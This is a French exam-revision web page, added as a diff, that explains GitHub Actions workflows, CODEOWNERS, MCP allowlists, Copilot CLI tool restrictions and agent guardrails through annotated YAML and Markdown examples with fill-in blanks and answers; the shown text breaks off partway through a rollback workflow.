@@ -1,0 +1,1544 @@
+<!doctype html>
+<html lang="fr"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GH-600 · Exemples YAML &amp; Markdown</title><link rel="stylesheet" href="assets/style.css"></head>
+<body><div class="layout"><nav class="side"><div class="brand"><i>⚡</i>Révisions GH-600</div><a href="index.html">Accueil révisions</a><div class="grp">Domaines</div><a href="01-architecture-sdlc.html">1 · Architecture & SDLC</a><a href="02-outils-mcp-environnements.html">2 · Outils, MCP & environnements</a><a href="03-memoire-etat.html">3 · Mémoire, état & exécution</a><a href="04-evaluation-tuning.html">4 · Évaluation & ajustement</a><a href="05-multi-agents.html">5 · Orchestration multi-agents</a><a href="06-garde-fous.html">6 · Garde-fous & responsabilité</a><div class="grp">S'entraîner</div><a href="07-scenarios.html">Scénarios d'examen</a><a href="08-quiz.html">Quiz (examen blanc)</a><a href="09-fiche-memo.html">Fiche mémo</a><a class="on" href="10-exemples-yaml-md.html">Exemples YAML &amp; MD</a><a href="11-glossaire-faq.html">Glossaire &amp; FAQ</a><div class="grp">Formation</div><a href="../html/index.html">Retour à la formation</a></nav>
+<main>
+<header class="hero"><h1>Exemples YAML &amp; Markdown</h1>
+<p>Workflows, agents, MCP, CODEOWNERS, politiques et Copilot CLI : les fichiers que l'examen vous montre, avec coloration, trous à compléter et pièges à repérer.</p>
+<div class="tags"><span>Transversal : domaines 1 à 6</span><span>Style « (Missing value N) »</span></div></header>
+
+<div class="box astuce"><b>Comment s'en servir</b>Les blocs contiennent des trous <code>(Missing value N)</code> comme à l'examen. Complétez de tête, puis ouvrez « Réponse ». Chaque exemple se termine par la liste des pièges à reconnaître.</div>
+
+<h2>1 · Workflow de validation et protection de branche</h2>
+<p>Un workflow <code>agent-validation</code>, un <code>CODEOWNERS</code> et une protection de <code>main</code>. La question classique : <em>pourquoi la fusion reste-t-elle bloquée ?</em></p>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/agent-validation.yml"><code># Nom du workflow dans l'onglet Actions (le check requis porte le nom du JOB)
+name: agent-validation
+
+# Déclencheurs : les évènements qui démarrent le workflow
+on:
+  # Sur pull request : le code proposé est contrôlé avant fusion
+  pull_request:
+    # Filtre : branches cibles de la PR
+    branches:
+      # La branche protégée par le ruleset
+      - main
+  # File de fusion : sans ceci, le check requis ne tourne pas dans la merge queue
+  merge_group:
+
+# Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+permissions:
+  # Lire le code uniquement, aucune écriture
+  contents: read
+  # Lire les PR (nécessaire à gh pr view)
+  pull-requests: read
+
+# Les jobs : unités de travail. Le NOM du job devient le nom du check
+jobs:
+  # Job « test » : c'est CE nom que le ruleset doit exiger (pas le nom du workflow)
+  test:
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Étapes exécutées dans l'ordre
+    steps:
+      # Récupère le code du dépôt (sans ça, aucun fichier à tester)
+      - uses: actions/checkout@v4
+      # Installation reproductible depuis le lockfile
+      - run: npm ci
+      # Tests : une preuve, pas une approbation de fusion
+      - run: npm test</code></pre>
+<pre class="code" data-lang="policy" data-file=".github/CODEOWNERS"><code># .github/CODEOWNERS
+# Chemin sensible : la revue de cette équipe est exigée
+/src/payments/ @octo-org/payments-reviewers
+# Modifier un workflow = modifier la sécurité : revue plateforme
+/.github/workflows/ @octo-org/platform-reviewers</code></pre>
+<pre class="code" data-lang="policy" data-file="Branch protection for main"><code>Branch protection for main:
+# Aucun push direct : tout passe par une PR
+- Require pull request before merging: enabled
+# Sans cette case, CODEOWNERS ne sert à rien
+- Require review from Code Owners: enabled
+# Les contrôles automatiques doivent être verts
+- Require status checks before merging: enabled
+# Nom du JOB à exiger (pas du workflow)
+- Required check: agent-validation</code></pre>
+<details class="rep"><summary>Réponse : que se passe-t-il ?</summary>
+<p>Le check requis est <code>agent-validation</code>, qui est le nom du <strong>workflow</strong>. Or le contexte de statut publié est le nom du <strong>job</strong> : <code>test</code>. Le check requis n'est jamais rapporté, la fusion reste en attente. Corrections : requérir <code>test</code>, ou nommer le job <code>agent-validation</code>.</p>
+<ul>
+<li><code>merge_group:</code> est nécessaire pour que le check tourne aussi dans une file de fusion.</li>
+<li>Un changement de <code>.github/workflows/</code> exige la revue de <code>platform-reviewers</code> : un agent ne peut pas modifier sa propre validation sans eux.</li>
+<li><code>contents: read</code> + <code>pull-requests: read</code> : moindre privilège, aucune écriture.</li>
+</ul></details>
+<div class="box piege"><b>Pièges</b><ul>
+<li>Nom du workflow ≠ nom du check : c'est le <strong>job</strong> (ou <code>workflow / job</code> pour les jobs à matrice) qui compte.</li>
+<li>Des tests verts ne valent pas approbation : la revue des Code Owners reste exigée.</li>
+<li>Sans <code>merge_group</code>, un check requis ne s'exécute pas sur la file de fusion.</li>
+</ul></div>
+
+<h2>2 · Workflow qui valide le plan d'un agent</h2>
+<pre class="code" data-lang="md" data-file=".github/copilot-instructions.md"><code># .github/copilot-instructions.md
+
+Before implementing an assigned issue, create an implementation plan.
+
+The plan must include:
+- Scope
+- Affected files
+- Security risks
+- Test strategy
+- Rollback notes
+
+Do not treat passing tests as approval to merge.</code></pre>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/validate-agent-plan.yml"><code># Nom du workflow dans l'onglet Actions (le check requis porte le nom du JOB)
+name: validate-agent-plan
+
+# Déclencheurs : les évènements qui démarrent le workflow
+on:
+  # Sur pull request : le code proposé est contrôlé avant fusion
+  pull_request:
+    # Filtre : branches cibles de la PR
+    branches:
+      # La branche protégée par le ruleset
+      - main
+    # Sous-évènements précis qui déclenchent le workflow
+    types:
+      # PR (ou issue) ouverte
+      - opened
+      # Nouveaux commits poussés sur la PR
+      - synchronize
+      # PR passée de brouillon à prête : nom exact de l'évènement
+      - ready_for_review
+
+# Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+permissions:
+  # Lire le code uniquement, aucune écriture
+  contents: read
+  # Droit sur les PR, volontairement en lecture seule
+  (Missing value 2): read
+
+# Les jobs : unités de travail. Le NOM du job devient le nom du check
+jobs:
+  # Job qui contrôle le plan de l'agent
+  validate-plan:
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Variables d'environnement : entrées externes passées sans injection
+    env:
+      # Jeton pour la CLI gh, limité par permissions
+      GH_TOKEN: ${{ github.token }}
+      # Numéro de PR passé par variable (jamais directement dans run)
+      PR_NUMBER: ${{ github.event.pull_request.number }}
+    # Étapes exécutées dans l'ordre
+    steps:
+      # Récupère le code du dépôt (sans ça, aucun fichier à tester)
+      - uses: actions/checkout@v4
+
+      - name: Inspect pull request metadata
+        # Lit titre, corps, brouillon et fichiers de la PR
+        run: gh pr view "$PR_NUMBER" --json title,body,isDraft,files
+
+      - name: Validate required plan sections
+        # Mot-clé du bloc qui exécute un script shell multiligne
+        (Missing value 3): |
+          # Le fichier de plan doit exister
+          test -f .github/agent-plans/implementation-plan.md
+          # Section « Scope » obligatoire dans le plan
+          grep -q "## Scope" .github/agent-plans/implementation-plan.md
+          # Section « Acceptance criteria » obligatoire
+          grep -q "## Acceptance criteria" .github/agent-plans/implementation-plan.md
+          # Section « Validation steps » obligatoire
+          grep -q "## Validation steps" .github/agent-plans/implementation-plan.md</code></pre>
+<details class="rep"><summary>Réponse : valeurs manquantes</summary>
+<ul>
+<li><strong>Value 2</strong> : <code>pull-requests: read</code> (nécessaire à <code>gh pr view</code>, sans droit d'écriture).</li>
+<li><strong>Value 3</strong> : <code>run</code> (le bloc multiligne <code>run: |</code> exécute les commandes shell).</li>
+</ul>
+<p>Autre piège : le type s'écrit <code>ready_for_review</code> (et non <em>ready</em>). Le numéro de PR passe par <code>env:</code>, jamais <code>${{ … }}</code> directement dans <code>run:</code> (injection de commande).</p></details>
+<div class="box memo"><b>À retenir</b>Une consigne dans <code>copilot-instructions.md</code> guide l'agent ; seul un <strong>check requis</strong> impose le plan. Les deux se complètent : instruction + contrôle déterministe.</div>
+
+<h2>3 · copilot-setup-steps.yml</h2>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/copilot-setup-steps.yml"><code># Déclencheurs : les évènements qui démarrent le workflow
+on:
+  # Lancement manuel par un humain (pas d'exécution implicite)
+  workflow_dispatch:
+  # Sur push de commits
+  push:
+    # Filtre : ne se déclenche que si ces fichiers changent
+    paths:
+      # Le fichier lui-même : on le valide dès qu'on le modifie
+      - .github/workflows/copilot-setup-steps.yml
+  # Sur pull request : le code proposé est contrôlé avant fusion
+  pull_request:
+    # Filtre : ne se déclenche que si ces fichiers changent
+    paths:
+      # Le fichier lui-même : on le valide dès qu'on le modifie
+      - .github/workflows/copilot-setup-steps.yml
+
+# Les jobs : unités de travail. Le NOM du job devient le nom du check
+jobs:
+  # Nom du job : un contrat avec Copilot, doit être exact
+  (Missing value 1):
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+    permissions:
+      # Lire le code uniquement, aucune écriture
+      contents: read
+    # Étapes exécutées dans l'ordre
+    steps:
+      - name: Checkout code
+        # Récupère le code du dépôt (sans ça, aucun fichier à tester)
+        uses: actions/checkout@v4
+
+      - name: Set up Node.js
+        # Action officielle qui installe l'environnement Node.js
+        uses: (Missing value 2)
+        # Paramètres de l'action
+        with:
+          # Version de Node imposée
+          node-version: "20"
+
+      - name: Install dependencies
+        # Installation reproductible depuis le lockfile
+        run: npm ci
+
+      - name: Install browser tools
+        # Commande d'installation des navigateurs pour les tests
+        run: (Missing value 3)</code></pre>
+<details class="rep"><summary>Réponse : valeurs manquantes</summary>
+<ul>
+<li><strong>Value 1</strong> : <code>copilot-setup-steps</code>. Le job doit porter <strong>exactement</strong> ce nom, sinon Copilot ne l'utilise pas.</li>
+<li><strong>Value 2</strong> : <code>actions/setup-node@v4</code>.</li>
+<li><strong>Value 3</strong> : par exemple <code>npx playwright install --with-deps chromium</code>.</li>
+</ul>
+<p>Les déclencheurs <code>push</code>/<code>pull_request</code> sur le fichier lui-même servent à le valider quand on le modifie ; <code>workflow_dispatch</code> permet de le lancer à la main.</p></details>
+<div class="box piege"><b>Pièges</b><ul>
+<li>Job renommé : l'environnement de l'agent ne se prépare plus, sans erreur visible.</li>
+<li>Pas d'étape <code>checkout</code> : le code n'est pas là pour <code>npm ci</code>.</li>
+<li>Permissions larges : garder <code>contents: read</code>.</li>
+</ul></div>
+
+<h2>4 · Profil d'agent et serveur MCP</h2>
+<pre class="code" data-lang="md" data-file=".github/agents/incident-remediation.agent.md"><code>---
+# Identifiant de l'agent
+name: incident-remediation-agent
+# Dit QUAND utiliser cet agent (sert à le choisir)
+description: Investigates production incidents, patches code, and adds regression tests.
+# Liste blanche d'outils : ce qui n'est pas listé n'existe pas pour l'agent
+tools:
+  # Lire des fichiers
+  - read
+  # Chercher dans le dépôt
+  - search
+  # ÉCRIRE dans les fichiers (à retirer pour un agent en lecture seule)
+  - edit
+  # Exécuter des commandes shell : large, à encadrer par un hook
+  - execute
+  # Outil MCP « serveur/outil » : doit aussi être autorisé côté serveur
+  - sentry/list_issues
+  # Outil MCP « serveur/outil » : doit aussi être autorisé côté serveur
+  - sentry/get_issue
+# Serveurs MCP embarqués avec ce profil
+mcp-servers:
+  # Nom local du serveur MCP
+  sentry:
+    # Transport du serveur : HTTP
+    type: http
+    # Adresse du serveur (variante lecture seule quand c'est possible)
+    url: https://mcp.example.internal/sentry
+    # Outils exposés par le serveur : liste d'autorisation côté serveur
+    tools:
+      # Outil autorisé côté serveur
+      - list_issues
+---
+
+# Rôle
+Tu investigues un incident, proposes un correctif minimal et ajoutes un test de non-régression.
+
+## Règles
+- Lecture seule sur Sentry : ne jamais modifier ou résoudre une issue.
+- Pas de `git push` : ouvrir une PR en brouillon.
+- Citer l'identifiant d'issue Sentry dans la PR.</code></pre>
+<details class="rep"><summary>Réponse : quelle incohérence ?</summary>
+<p>L'agent déclare <code>sentry/get_issue</code> dans <code>tools</code>, mais le serveur n'expose que <code>list_issues</code> (<code>tools:</code> du serveur). <code>get_issue</code> n'est pas autorisé côté MCP : il faut l'ajouter dans la liste du serveur, ou le retirer de l'agent. La liste du serveur fait office de <strong>liste d'autorisation</strong>.</p>
+<p>Autre point de vigilance : <code>execute</code> est large. Pour un agent d'incident, le restreindre ou le garder derrière des hooks <code>preToolUse</code>.</p></details>
+<pre class="code" data-lang="md" data-file="Version corrigée (extrait)"><code># Serveurs MCP embarqués avec ce profil
+mcp-servers:
+  # Nom local du serveur MCP
+  sentry:
+    # Transport du serveur : HTTP
+    type: http
+    # Adresse du serveur (variante lecture seule quand c'est possible)
+    url: https://mcp.example.internal/sentry
+    # Outils exposés par le serveur : liste d'autorisation côté serveur
+    tools:
+      # Outil autorisé côté serveur
+      - list_issues
+      # Outil autorisé côté serveur
+      - get_issue</code></pre>
+
+<h2>5 · CODEOWNERS sur .github/agents/** et check guardrail-policy-check</h2>
+<p>Les fichiers qui <em>pilotent</em> les agents (instructions, profils, MCP, workflows) sont de la chaîne d'approvisionnement : relus par des propriétaires dédiés, protégés par un check requis.</p>
+<pre class="code" data-lang="policy" data-file=".github/CODEOWNERS"><code># .github/CODEOWNERS
+# Instructions des agents : gouvernance IA
+.github/copilot-instructions.md @octo-org/ai-governance
+# Tous les profils d'agent (récursif) : l'agent ne valide pas son propre profil
+.github/agents/** @octo-org/ai-governance
+# Serveurs MCP : ajouter un serveur est une décision de sécurité
+.github/mcp.json @octo-org/platform-security
+# Tous les workflows, dont le contrôle lui-même
+.github/workflows/** @octo-org/platform-security</code></pre>
+<pre class="code" data-lang="policy" data-file="Branch protection for main"><code>Branch protection for main:
+# Aucun push direct : tout passe par une PR
+- Require pull request before merging: enabled
+# Sans cette case, CODEOWNERS ne sert à rien
+- Require review from Code Owners: enabled
+# Les contrôles automatiques doivent être verts
+- Require status checks before merging: enabled
+# Nom du JOB à exiger (pas du workflow)
+- Required check: guardrail-policy-check
+# Même un administrateur passe par la PR : politique non contournable
+- Allow bypassing required pull requests: disabled</code></pre>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/guardrail-policy-check.yml"><code># Nom du workflow dans l'onglet Actions (le check requis porte le nom du JOB)
+name: guardrail-policy-check
+
+# Déclencheurs : les évènements qui démarrent le workflow
+on:
+  # Sur pull request : le code proposé est contrôlé avant fusion
+  pull_request:
+    # Filtre : branches cibles de la PR
+    branches:
+      # La branche protégée par le ruleset
+      - main
+  # File de fusion : sans ceci, le check requis ne tourne pas dans la merge queue
+  merge_group:
+
+# Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+permissions:
+  # Lire le code uniquement, aucune écriture
+  contents: read
+
+# Les jobs : unités de travail. Le NOM du job devient le nom du check
+jobs:
+  # Job = check requis : même nom que dans la protection de branche
+  guardrail-policy-check:
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Étapes exécutées dans l'ordre
+    steps:
+      # Récupère le code du dépôt (sans ça, aucun fichier à tester)
+      - uses: actions/checkout@v4
+
+      # Chaque serveur MCP déclaré doit figurer dans la liste d'autorisation
+      - name: MCP allowlist
+        run: |
+          # Liste les serveurs MCP déclarés dans mcp.json
+          jq -r '.mcpServers | keys[]' .github/mcp.json | while read -r s; do
+            # Vérifie que chaque serveur figure dans la liste d'autorisation
+            jq -e --arg s "$s" 'index($s)' .github/mcp-allowlist.json >/dev/null \
+              || { echo "Serveur MCP non autorisé : $s"; exit 1; }
+          done
+
+      # Aucun profil d'agent ne doit donner un outil d'écriture non listé
+      - name: Agents must declare tools
+        run: |
+          # Parcourt tous les profils d'agent
+          for f in .github/agents/*.agent.md; do
+            # Refuse un profil sans liste d'outils explicite
+            grep -q '^tools:' "$f" || { echo "tools manquant : $f"; exit 1; }
+          done</code></pre>
+<details class="rep"><summary>Pourquoi chaque ligne compte</summary>
+<ul>
+<li><strong>CODEOWNERS</strong> + « Require review from Code Owners » : sans la case, le fichier ne sert à rien.</li>
+<li><strong>Check requis</strong> : le contrôle automatique ne peut pas être ignoré ; son job porte le même nom que le check.</li>
+<li><strong>« Allow bypassing » désactivé</strong> : même un administrateur passe par la PR, sinon la politique est contournable.</li>
+<li>Le workflow de contrôle est lui-même sous <code>.github/workflows/**</code> : protégé par <code>platform-security</code>.</li>
+</ul></details>
+<div class="box piege"><b>Pièges</b><ul>
+<li>Un CODEOWNERS non couvert (<code>.github/agents/**</code> oublié) : l'agent peut modifier son propre profil avec une revue ordinaire.</li>
+<li>Le contournement autorisé annule tout le reste.</li>
+<li>Une équipe de propriétaires sans accès en écriture au dépôt n'est pas prise en compte.</li>
+</ul></div>
+
+<h2>6 · Politique de liste d'autorisation MCP</h2>
+<p>Deux niveaux : l'organisation décide quels serveurs sont <strong>permis</strong> (politique / registre) ; le dépôt déclare ceux qu'il <strong>utilise</strong>.</p>
+<pre class="code" data-lang="json" data-file=".github/mcp.json"><code>{
+  "mcpServers": {
+    "sentry": {
+      "type": "http",
+      "url": "https://mcp.example.internal/sentry",
+      "tools": ["list_issues", "get_issue"]
+    },
+    "github": {
+      "type": "http",
+      "url": "https://api.githubcopilot.com/mcp/readonly",
+      "tools": ["*"]
+    }
+  }
+}</code></pre>
+<pre class="code" data-lang="json" data-file=".github/mcp-allowlist.json"><code>["sentry", "github"]</code></pre>
+<div class="box memo"><b>À savoir</b><ul>
+<li>Moindre privilège MCP : serveur en <strong>lecture seule</strong> + <code>tools</code> listés (pas de <code>"*"</code> pour un outil qui écrit).</li>
+<li>Le <strong>registre MCP</strong> de l'organisation limite aux serveurs approuvés ; le dépôt ne peut pas en ajouter hors liste.</li>
+<li>Un secret de serveur MCP du cloud agent : secret de type <strong>Agents</strong>, jamais en clair dans <code>mcp.json</code>.</li>
+<li>Le fichier <code>mcp.json</code> a ses propres propriétaires (<code>platform-security</code>) : ajouter un serveur est une décision de sécurité.</li>
+</ul></div>
+
+<h2>7 · Copilot CLI : outil d'écriture refusé</h2>
+<pre class="code" data-lang="sh" data-file="Terminal"><code># Autoriser la lecture et quelques commandes git précises, refuser l'écriture.
+# Lecture des options (une seule commande, coupée par « \ » pour la lisibilité) :
+#   copilot                          lance l'agent en ligne de commande
+#   --allow-tool 'shell(git status)' autorise CETTE commande shell précise
+#   --allow-tool 'shell(git diff)'   autorise aussi git diff, rien d'autre en git
+#   --deny-tool 'write'              refuse tout outil d'écriture de fichiers
+#   --deny-tool 'shell(git push)'    refuse le push : le refus l'emporte toujours sur un allow
+copilot \
+  --allow-tool 'shell(git status)' \
+  --allow-tool 'shell(git diff)' \
+  --deny-tool 'write' \
+  --deny-tool 'shell(git push)'
+
+# Refuser un outil MCP précis : format « serveur(outil) », ici l'outil qui résout une issue Sentry
+copilot --deny-tool 'sentry(resolve_issue)'</code></pre>
+<ul>
+<li>Un refus (<code>--deny-tool</code>) l'emporte sur une autorisation (<code>--allow-tool</code>), même si <code>--allow-all-tools</code> est présent.</li>
+<li>Pour un refus <strong>non contournable par l'utilisateur</strong>, passer par un hook de politique administrateur ou <code>preToolUse</code> : une option de ligne de commande se retire.</li>
+</ul>
+<pre class="code" data-lang="json" data-file=".github/hooks/deny-write.json (hook preToolUse)"><code>{
+  "version": 1,
+  "hooks": {
+    "preToolUse": [
+      { "type": "command", "bash": "./scripts/deny-write.sh", "timeoutSec": 10 }
+    ]
+  }
+}</code></pre>
+<pre class="code" data-lang="sh" data-file="scripts/deny-write.sh"><code>#!/usr/bin/env bash
+# Entrée JSON sur stdin ; refuser tout écriture hors sortie/
+# Lit tout le JSON envoyé par l'agent
+input=$(cat)
+# Nom de l'outil demandé (edit, bash...)
+tool=$(echo "$input" | jq -r '.toolName')
+# Chemin visé par l'écriture, vide sinon
+path=$(echo "$input" | jq -r '.toolArgs.path // empty')
+
+# Règle : écriture permise seulement dans sortie/
+if [ "$tool" = "edit" ] &amp;&amp; [[ "$path" != sortie/* ]]; then
+  # Refus avec raison obligatoire
+  echo '{"permissionDecision":"deny","permissionDecisionReason":"Écriture hors sortie/ interdite"}'
+fi
+# Pas d'objection : ne rien répondre (ou {}), jamais "allow"</code></pre>
+<div class="box piege"><b>Pièges</b><ul>
+<li>Répondre <code>allow</code> dans un hook de sécurité court-circuite l'approbation normale.</li>
+<li>Hook trop lent : <strong>délai dépassé = autorisé</strong> (fail-open). Garder le script court.</li>
+<li>Script qui plante ou sort non nul : refus (fail-closed).</li>
+</ul></div>
+
+<h2>8 · Journal multi-agents : lire un échec de passation</h2>
+<pre class="code" data-lang="yaml" data-file="Journal de workflow"><code># Évènement qui a déclenché l'exécution
+Event: pull_request
+# Qui a agi : le bot Copilot
+Actor: github-copilot[bot]
+
+# Étape 1 : le planificateur décide, il n'implémente pas
+Job: planner
+Conclusion: success
+Output:
+  # Contrainte posée par le planificateur : le schéma ne doit pas changer
+  decision = "Proceed only if schema remains unchanged"
+Artifact:
+  # Passation par artefact écrit, pas par conversation
+  planner-handoff.md uploaded
+
+# Étape 2 : l'implémenteur applique le plan
+Job: implementer
+Conclusion: success
+Log:
+  Changed files:
+    src/orders/serializer.ts
+    # INDICE : une migration = un changement de schéma
+    db/migrations/20260526_add_order_state.sql
+  Outcome note:
+    # L'implémenteur déclare lui-même avoir changé le schéma
+    "Added schema migration to support new state"
+
+# Étape 3 : le réviseur compare plan et résultat
+Job: reviewer
+Conclusion: failure
+Log:
+  # Le réviseur lit la décision durable
+  Loaded planner decision from planner-handoff.md
+  # Le réviseur lit le résultat réel
+  Loaded implementer outcome from implementation-summary.md
+  # Contradiction détectée : le plan n'a pas été respecté
+  ERROR: Handoff violation detected
+  Planner decision forbids schema change, but implementer changed db/migrations/</code></pre>
+<details class="rep"><summary>Réponse : quelle est la cause ?</summary>
+<p>L'<strong>implémenteur a violé la contrainte du planificateur</strong> (pas de changement de schéma) : il a ajouté une migration. Le réviseur a bien fait son travail en comparant la décision <em>durable</em> (<code>planner-handoff.md</code>) au résultat (<code>implementation-summary.md</code>). L'échec n'est ni un bug du réviseur, ni un problème de permissions.</p>
+<p>Fix : faire de la contrainte un <strong>mécanisme</strong> (check interdisant <code>db/migrations/**</code> tant que le plan ne l'autorise pas), et renvoyer à l'humain la décision « le schéma doit changer ».</p></details>
+<div class="box memo"><b>Réflexes</b><ul>
+<li>Passation par <strong>artefact écrit</strong>, pas par la mémoire d'un agent.</li>
+<li>Le réviseur lit les artefacts, pas les affirmations (« success » du job ne prouve pas la conformité).</li>
+<li>Une contrainte qui conditionne la suite doit être vérifiable par un contrôle automatique.</li>
+</ul></div>
+
+<h2>9 · Cas d'usage concrets</h2>
+<p>Six situations réelles, avec un YAML complet et son explication juste en dessous.</p>
+
+<h3>Cas A · Bloquer une PR qui touche les sources protégées</h3>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/politique-sources.yml"><code># Nom du workflow dans l'onglet Actions (le check requis porte le nom du JOB)
+name: Politique - sources protégées
+
+# Déclencheurs : les évènements qui démarrent le workflow
+on:
+  # Sur pull request : le code proposé est contrôlé avant fusion
+  pull_request:
+    # Filtre : branches cibles de la PR
+    branches:
+      # La branche protégée par le ruleset
+      - main
+
+# Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+permissions:
+  # Lire le code uniquement, aucune écriture
+  contents: read
+  # Lire les PR (nécessaire à gh pr view)
+  pull-requests: read
+
+# Les jobs : unités de travail. Le NOM du job devient le nom du check
+jobs:
+  # Job qui protège les données sources
+  sources-protegees:
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Étapes exécutées dans l'ordre
+    steps:
+      # Récupère le code du dépôt (sans ça, aucun fichier à tester)
+      - uses: actions/checkout@v4
+        # Paramètres de l'action
+        with:
+          # Historique complet : nécessaire pour comparer deux commits
+          fetch-depth: 0
+
+      - name: Refuser toute modification de entree/ et contexte/
+        # Variables d'environnement : entrées externes passées sans injection
+        env:
+          # Commit de base de la PR, passé par variable
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          # Dernier commit de la PR, passé par variable
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+        run: |
+          # Liste des fichiers modifiés par la PR
+          changed=$(git diff --name-only "$BASE_SHA" "$HEAD_SHA")
+          # Cherche une modification dans un dossier interdit
+          if echo "$changed" | grep -E '^(entree|contexte)/'; then
+            # Annotation d'erreur visible directement dans la PR
+            echo "::error::Les sources protégées ne sont pas modifiables par PR."
+            # Échec du job : le check passe au rouge et bloque la fusion
+            exit 1
+          fi</code></pre>
+<p><strong>Explication.</strong> L'agent peut écrire dans <code>sortie/</code> mais jamais dans les données sources. Plutôt que de le demander dans une instruction, on l'<strong>impose</strong> : le job échoue si le diff touche <code>entree/</code> ou <code>contexte/</code>. Une fois le job déclaré « check requis » dans le ruleset, la fusion est impossible. Les SHA passent par <code>env:</code> (pas d'injection) et les permissions restent en lecture. <em>Réflexe d'examen : mécanisme &gt; consigne.</em></p>
+
+<h3>Cas B · Publication derrière un environnement protégé</h3>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/publication.yml"><code># Nom du workflow dans l'onglet Actions (le check requis porte le nom du JOB)
+name: publication
+
+# Déclencheurs : les évènements qui démarrent le workflow
+on:
+  # Lancement manuel par un humain (pas d'exécution implicite)
+  workflow_dispatch:
+
+# Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+permissions:
+  # Lire le code uniquement, aucune écriture
+  contents: read
+
+# Les jobs : unités de travail. Le NOM du job devient le nom du check
+jobs:
+  # Job de construction : produit un artefact, sans droit d'écriture
+  build:
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Étapes exécutées dans l'ordre
+    steps:
+      # Récupère le code du dépôt (sans ça, aucun fichier à tester)
+      - uses: actions/checkout@v4
+      # Installation reproductible depuis le lockfile
+      - run: npm ci
+      # Compile le projet
+      - run: npm run build
+      # Conserve le résultat comme artefact inspectable
+      - uses: actions/upload-artifact@v4
+        # Paramètres de l'action
+        with:
+          # Nom de l'artefact
+          name: site
+          # Dossier conservé
+          path: dist/
+
+  # Job de publication : le seul à avoir des droits d'écriture
+  publier:
+    # Attend la réussite du build avant de publier
+    needs: build
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Environnement protégé : approbateur humain requis avant le démarrage
+    environment: publication
+    # Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+    permissions:
+      # Lire le code uniquement, aucune écriture
+      contents: read
+      # Publier sur Pages : réservé au job de déploiement
+      pages: write
+      # Jeton OIDC : s'authentifier sans secret longue durée
+      id-token: write
+    # Étapes exécutées dans l'ordre
+    steps:
+      # Récupère l'artefact produit plus tôt
+      - uses: actions/download-artifact@v4
+        # Paramètres de l'action
+        with:
+          # Nom de l'artefact
+          name: site
+      # Publication : irréversible, donc derrière l'environnement
+      - run: ./deploy.sh
+        # Variables d'environnement : entrées externes passées sans injection
+        env:
+          # Secret propre à l'environnement, invisible des autres jobs
+          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}</code></pre>
+<p><strong>Explication.</strong> Le déploiement est irréversible : il y a un humain, et <strong>seulement là</strong>. Le job <code>publier</code> déclare <code>environment: publication</code> ; l'environnement porte les approbateurs requis, l'interdiction de s'auto-approuver et le secret <code>DEPLOY_TOKEN</code> (invisible du job <code>build</code>). Les droits d'écriture (<code>pages</code>, <code>id-token</code>) ne sont donnés qu'à ce job, le reste du workflow reste en <code>contents: read</code>. Le <code>build</code> produit un artefact, donc la preuve est inspectable.</p>
+
+<h3>Cas C · Rollback par revert, sans réécrire l'histoire</h3>
+<pre class="code" data-lang="yaml" data-file=".github/workflows/rollback.yml"><code># Nom du workflow dans l'onglet Actions (le check requis porte le nom du JOB)
+name: rollback
+
+# Déclencheurs : les évènements qui démarrent le workflow
+on:
+  # Lancement manuel par un humain (pas d'exécution implicite)
+  workflow_dispatch:
+    # Paramètres saisis par l'opérateur au lancement
+    inputs:
+      # Paramètre « commit »
+      commit:
+        # Aide affichée à l'opérateur
+        description: SHA du commit fusionné à annuler
+        # Valeur obligatoire
+        required: true
+
+# Droits du jeton GITHUB_TOKEN : moindre privilège (lecture par défaut)
+permissions:
+  # ÉCRITURE du code : à confiner au job qui en a vraiment besoin
+  contents: write
+  # Écrire dans les PR (créer, commenter)
+  pull-requests: write
+
+# Les jobs : unités de travail. Le NOM du job devient le nom du check
+jobs:
+  # Job de retour arrière par revert
+  revert:
+    # Machine virtuelle hébergée qui exécute le job
+    runs-on: ubuntu-latest
+    # Environnement protégé : un humain valide le retour arrière
+    environment: rollback
+    # Variables d'environnement : entrées externes passées sans injection
+    env:
+      # Saisie utilisateur passée par variable, pas par ${{ }} dans run
+      COMMIT: ${{ inputs.commit }}
+      # Jeton pour la CLI gh, limité par permissions
+      GH_TOKEN: ${{ github.token }}
+    # Étapes exécutées dans l'ordre
+    steps:
+      # Récupère le code du dépôt (sans ça, aucun fichier à tester)
+      - uses: actions/checkout@v4
+        # Paramètres de l'action
+        with:
+          # Historique complet : nécessaire pour comparer deux commits
+          fetch-depth: 0
+
+      - name: Créer la branche de revert
+        run: |
+          # Identité du commit de revert : le bot (traçabilité)
+          git config user.name "github-actions[bot]"
+          # Adresse associée à l'identité du bot
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          # Crée une branche dédiée : on ne pousse jamais sur main
+          git switch -c "revert/${COMMIT:0:7}"
+          # Ajoute un commit qui annule l'autre (historique préservé)
+          git revert --no-edit "$COMMIT"
+          # Pousse la branche de revert (pas main)
+          git push origin HEAD
+
+      - name: Ouvrir la PR de revert
+        run: |
+          # Ouvre la PR de revert : checks et revue habituels
+          gh pr create --base main --head "revert/${COMMIT:0:7}" \
